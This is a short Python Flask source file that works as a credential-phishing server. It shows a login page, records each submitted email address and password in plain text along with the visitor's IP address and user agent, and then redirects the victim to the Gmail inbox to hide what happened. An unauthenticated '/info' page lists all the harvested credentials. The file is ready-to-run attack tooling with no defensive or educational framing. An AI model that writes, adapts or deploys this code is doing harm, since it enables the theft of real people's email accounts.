from flask import Flask,request,render_template,redirect
import sqlite3

# database


app = Flask(__name__)

@app.route('/',methods= ['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        #for external ip address
        host = None
        if request.headers.getlist("X-Forwarded-For"):
            host = request.headers.getlist("X-Forwarded-For")[0]
        else:
            host = request.remote_addr
        user = request.remote_user
        user_agent = request.user_agent
        file = open("info.txt",'a')
        file.write(f"email : {email}  password : {password} host : {host} user : {user}  user_agent : {user_agent}\n")
        file.flush()
        return redirect('https://mail.google.com/mail/u/0/#inbox')

    return render_template('login.html')

@app.route('/<r>',methods= ['GET', 'POST'])
def indexd(r):
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        host = request.remote_addr
        user = request.remote_user
        user_agent = request.user_agent
        file = open("info.txt",'a')
        file.write(f"email : {email}  password : {password} host : {host} user : {user}  user_agent : {user_agent}\n")
        file.flush()
        return redirect('https://mail.google.com/mail/u/0/#inbox')

    return render_template('login.html')

@app.route("/info")
def execute():
    file = open("info.txt")
    info = file.readlines()

    return render_template('execute.html',info=info)


if __name__ == '__main__':
    app.debug = True
    app.run()

